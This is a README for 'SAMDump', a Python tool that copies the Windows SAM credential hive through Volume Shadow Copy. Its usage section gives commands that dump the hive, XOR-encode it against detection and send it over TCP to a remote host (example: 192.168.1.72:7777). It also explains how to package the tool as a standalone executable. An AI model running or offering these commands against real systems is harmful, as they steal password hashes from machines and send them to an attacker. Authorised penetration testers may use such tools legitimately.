# SAMDump — Python

Python implementation using `ctypes` for NT API calls and `comtypes` for VSS COM interfaces.

## Requirements

- Python 3
- `comtypes` library: `pip install comtypes`
- Administrator privileges

## Usage

```
python SAMDump.py [OPTIONS]

Options:
  --save-local          Save files locally
  --output-dir <path>   Output directory (default: C:\Windows\tasks)
  --send-remote         Send files over TCP
  --host <ip>           Remote host (default: 127.0.0.1)
  --port <port>         Remote port (default: 7777)
  --xor-encode          XOR encode before save/send
  --xor-key <key>       XOR key (default: SAMDump2025)
  --disk <vol>          Volume for shadow copy (default: C:\)
  --shadow-device <dev> Use existing shadow device path (skip VSS)
  --help                Show help
```

### Save locally

```
python SAMDump.py --save-local
```

### Send to a remote server with XOR encoding

```
python SAMDump.py --send-remote --host 192.168.1.72 --port 7777 --xor-encode
```

## Compile to standalone executable

Use PyInstaller to create a single `.exe` with no dependencies:

```
pip install pyinstaller
pyinstaller -F SAMDump.py
```

The executable will be in `dist\SAMDump.exe`:

```
dist\SAMDump.exe --save-local --output-dir C:\temp
```
